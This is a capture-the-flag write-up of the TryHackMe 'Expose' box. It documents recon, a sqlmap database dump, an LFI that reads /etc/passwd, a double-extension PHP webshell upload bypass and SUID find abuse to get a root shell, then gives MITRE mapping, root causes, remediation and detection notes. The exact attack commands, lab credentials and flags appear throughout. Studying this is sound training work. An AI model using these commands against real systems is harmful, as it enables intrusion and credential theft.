**Room:** https://tryhackme.com/room/expose

**POC doc:** Google Doc

## 1. Summary

Expose is a Linux box exposing FTP, SSH, DNS, a custom web app on port 1337, and MQTT. The web app's login endpoint is SQL-injectable, leaking DB credentials and two hidden admin panels. One panel has an LFI that dumps `/etc/passwd` to reveal a valid username; the other is an unauthenticated-by-role file upload with a client-side-only extension filter, bypassed via a double-extension PHP webshell to get a reverse shell. Local privesc to root is via a SUID `find` binary (GTFOBins).

## 2. Attack Path

### Recon

```bash
nmap -sS -p- 10.49.160.140
nmap -sC -sV -p 21,22,53,1337,1883 10.49.160.140
```

- 21/tcp — vsftpd 3.0.3, **anonymous login allowed**
- 22/tcp — OpenSSH 8.2p1 (Ubuntu)
- 53/tcp — ISC BIND 9.16.1
- 1337/tcp — Apache 2.4.41, site titled "EXPOSED"
- 1883/tcp — Mosquitto 1.6.9 (MQTT, `$SYS` topics readable)

### Web content discovery

```bash
gobuster dir -u http://10.49.160.140:1337 -w /usr/share/wordlists/dirb/big.txt
```

Found `/admin`, `/admin_101`, `/javascript`, `/phpmyadmin`.

### SQL injection → credential/config dump

Intercepted a login POST to `/admin_101/includes/user_login.php`; the app echoed the raw query back in its error response, confirming unsanitized input reaching SQL.

```bash
sqlmap -u "http://10.49.160.140:1337/admin_101/includes/user_login.php" \
  --data="email=hacker%40root.thm&password=qwerty" --method=post --dbs

sqlmap ... -D expose --tables
sqlmap ... -D expose -T user --columns
sqlmap ... -D expose --dump
```

Dumped:

- `expose.user` → `hacker@root.thm : VeryDifficultPassword!!#@#@!#!@#1231`
- `expose.config` → two hidden endpoints:
    - `/file1010111/index.php` — password hash `69c66901194a6486176e81f5945b8929`
    - `/upload-cv00101011/index.php` — comment: "ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z"

### Hash crack → LFI panel

Cracked the MD5 hash to authenticate to `/file1010111/`. Page hint: *"Parameter Fuzzing is also important :) or Can you hide DOM elements?"* — fuzzing/inspecting the DOM revealed a hidden `file` parameter:

```
http://10.49.160.140:1337/file1010111/index.php?file=/etc/passwd
```

Leaked `/etc/passwd`, revealing local user `zeamkish` — satisfies the "username starting with Z" gate on the upload panel.

### Upload filter bypass → RCE

Logged into `/upload-cv00101011/index.php` as `zeamkish`. Client-side JS only checked extension:

```jsx
if (fileExtension === 'jpg' || fileExtension === 'png') { ... }
```

No server-side validation. Bypassed by naming a PHP webshell with a double extension (`shell.php.jpg`), which Apache still executed as PHP due to the multi-extension handling. Uploaded to:

```
/upload-cv00101011/upload_thm_1001/shell.php.jpg
```

### Reverse shell → SSH creds

Triggered the webshell with a listener; on the box found:

```
ssh_creds.txt → zeamkish : easytohack@123
```

### User flag

```bash
ssh zeamkish@10.49.160.140
cat flag.txt
# THM{USER_FLAG_1231_EXPOSE}
```

### Privilege escalation (SUID find → GTFOBins)

```bash
find / -perm -04000 2>/dev/null
# /usr/bin/find is SUID
/usr/bin/find -exec /bin/sh -p \; -quit
```

Dropped into a root shell.

```bash
cat /root/flag.txt
# THM{ROOT_EXPOSED_1001}
```

## 3. MITRE ATT&CK Mapping

| Stage | Tactic | Technique ID | Technique Name |
| --- | --- | --- | --- |
| Port/service scan | Reconnaissance | T1595 | Active Scanning |
| Directory brute force | Reconnaissance | T1595.003 | Active Scanning: Wordlist Scanning |
| SQL injection | Initial Access | T1190 | Exploit Public-Facing Application |
| DB credential/config dump via SQLi | Credential Access | T1552.001 | Unsecured Credentials: Credentials In Files |
| LFI + hidden parameter discovery | Discovery | T1083 | File and Directory Discovery |
| Password hash cracking | Credential Access | T1110.002 | Brute Force: Password Cracking |
| Upload filter bypass (client-side only) | Execution | T1505.003 | Server Software Component: Web Shell |
| Reverse shell via webshell | Command and Control | T1071 | Application Layer Protocol |
| Plaintext SSH creds on disk | Credential Access | T1552.001 | Unsecured Credentials: Credentials In Files |
| SUID `find` abuse | Privilege Escalation | T1548.001 | Abuse Elevation Control Mechanism: Setuid and Setgid |

## 4. Root Cause

- **SQLi:** Login endpoint built the query via string concatenation and returned the raw query in the error response — no parameterized queries, verbose error handling.
- **LFI:** The `file` parameter was hidden from the visible UI (DOM-hidden / not directly linked) but not removed from server logic, and no path allow-listing or canonicalization was applied — `../` or absolute paths were accepted directly.
- **Weak/reused secrets:** Config table stored a crackable MD5 hash instead of a salted, modern hash (bcrypt/argon2).
- **Upload bypass:** File-type validation existed only in client-side JavaScript; the server trusted the extension and Apache's multi-extension handling (`shell.php.jpg`) still invoked the PHP interpreter.
- **Plaintext credential storage:** SSH credentials stored in a world-readable text file in the web user's home directory.
- **Privesc:** `find` binary had the SUID bit set unnecessarily, allowing `-exec` to spawn a root shell (classic GTFOBins vector).

## 5. Remediation

- Use parameterized queries / prepared statements everywhere; never concatenate user input into SQL. Disable verbose SQL error messages in production.
- Enforce strict allow-listing for any file-inclusion parameter; never accept raw/absolute paths or `../` sequences; avoid exposing arbitrary file read functionality at all if possible.
- Store password hashes with bcrypt/argon2 + unique salts, not raw MD5.
- Validate file uploads server-side: check MIME type via content inspection (not extension string), strip/normalize filenames to a single known-good extension, store uploads outside the webroot or disable script execution in the upload directory (e.g., `php_admin_flag engine off` in that directory's Apache config).
- Never store credentials in plaintext files on disk; use a secrets manager or at minimum restrict file permissions (`chmod 600`, owned only by the necessary user).
- Remove unnecessary SUID bits from binaries like `find`, `nano`, etc. (`chmod u-s /usr/bin/find`), and regularly audit with `find / -perm -4000` on hardening reviews.
- Disable anonymous FTP login unless explicitly required.
- Restrict MQTT broker `$SYS` topic visibility / require auth on Mosquitto.

## 6. Key Takeaways

- Always intercept and read raw application error responses — an echoed SQL query is a direct signal of unsanitized input reaching the DB layer.
- SQLi impact isn't just data theft — here it led to full app config disclosure (hidden endpoints + credentials), which was the actual pivot point.
- Client-side-only validation (JS extension checks) is never a real control — always verify server-side handling, and try double extensions / null bytes / content-type spoofing.
- Hidden functionality gated by "username starting with X" is a weak access control — any LFI/enum that leaks usernames defeats it instantly.
- SUID auditing (`find / -perm -4000`) should be a standard step in every post-exploitation checklist — cross-reference against GTFOBins for quick privesc wins.
- Detection opportunities: SQLi attempts are visible in Apache access logs (repeated malformed `email=` parameters); webshell upload + execution would show as unusual `.jpg`/`.php` requests with POST bodies in access logs; SUID `find -exec` spawning a shell is detectable via auditd/EDR process-creation monitoring (parent `find` → child `sh`).
